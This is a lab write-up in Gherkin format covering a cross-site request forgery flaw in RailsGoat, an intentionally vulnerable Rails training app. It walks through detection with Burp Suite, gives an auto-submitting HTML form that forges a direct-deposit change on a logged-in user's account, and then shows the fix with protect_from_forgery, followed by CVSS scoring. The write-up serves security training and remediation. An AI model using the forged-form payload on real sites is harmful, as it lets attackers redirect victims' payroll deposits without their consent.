## Version 1.4.1
## language: en

Feature:
  TOE:
    railsgoat
  Category:
    Broken Authentication
  Location:
    http://localhost:3000/users/6/pay/update_dd_info.json - CSRF_token (param)
  CWE:
    CWE-352: https://cwe.mitre.org/data/slices/352.html
  Rule:
    REQ.029: https://fluidattacks.com/web/rules/029/
    REQ.173: https://fluidattacks.com/web/rules/173/
  Goal:
    Forge a malicious request and execute it with a logged user
  Recommendation:
    Implement CSRF token

  Background:
  Hacker's software:
    | <Software name> |   <Version>    |
    | Ubuntu          | 18.04.2 LTS    |
    | Mozilla Firefox | 68.0.2         |
    | Burp suite      | 1.7.35         |
  TOE information:
    Given I am accessing the site http://localhost:3000
    And the server is running Rails version 6.0.0
    And Ruby version 2.7.0-preview1
    And Sqlite3 version 1.3.13

  Scenario: Normal use case
    Given I'm logged in the application
    And I go to "Pay" tab
    When I submit a new "Direct Deposit"
    Then It is displayed in a table at the bottom page

  Scenario: Static detection
    Given the main controller "application_controller.rb"
    And the "application.html.erb" layout
    When I inspect the code
    Then I notice that there is no protection against CSRF

  Scenario: Dynamic detection
    Given I can submit a new "Direct Deposit"
    When I inspect the post request
    Then I see there is the "authenticity_token" parameter
    When I intercept the request with "Burp Suite"
    And I remove the "authenticity_token"
    Then I see there is no problem
    And the request is completed successfully
    Then I conclude the application doesn't validate the token
    And I could send any request without it

  Scenario: Exploitation
    Given the application doesn't validate the token
    When I make a file with the following html to add a new "Direct Deposit":
    """
    1 <html>
    2  <body onload=document.forms['myform'].submit()>
    3    <form action="http://localhost:3000/users/6/pay/update_dd_info.json"
    4    method="POST" id="myform">
    5     <input type="hidden" name="utf8" value="�&#156;&#147;" />
    6     <input type="hidden" name="bank&#95;account&#95;num" value="123456"/>
    7     <input type="hidden" name="bank&#95;routing&#95;num" value="789101"/>
    8     <input type="hidden" name="dd&#95;percent" value="85" />
    9     <input type="submit" value="Submit request" />
    10   </form>
    11  </body>
    12 </html>
    """
    And once I'm logged in I open the file
    Then I get a successful message
    When I inspect the table at the bottom page where the deposits are located
    Then I see there is a new entry added automatically
    Then I conclude that the application is vulnerable to CSRF

  Scenario: Remediation
    Given I have patched the code by setting CSRF protection with this line:
    """
    protect_from_forgery with: :exception
    """
    And placing it in "application_controller.rb"
    And in the "application.html.erb" layout with this one:
    """
    <%= csrf_meta_tags %>
    """
    When I open the same html file
    Then I just get the error message
    """
    InvalidAuthenticityToken
    """
    Then I can confirm that the vulnerability was successfully patched

  Scenario: Scoring
  Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    5.4/10 (Medium) - AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
  Temporal: Attributes that measure the exploit's popularity and fixability
    5.1/10 (Medium) - E:F/RL:W/RC:C
  Environmental: Unique and relevant attributes to a specific user environment
    4.0/10 (Medium) - CR:L/IR:L/AR:L/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X

  Scenario: Correlations
    No correlations have been found to this date 2019-09-18
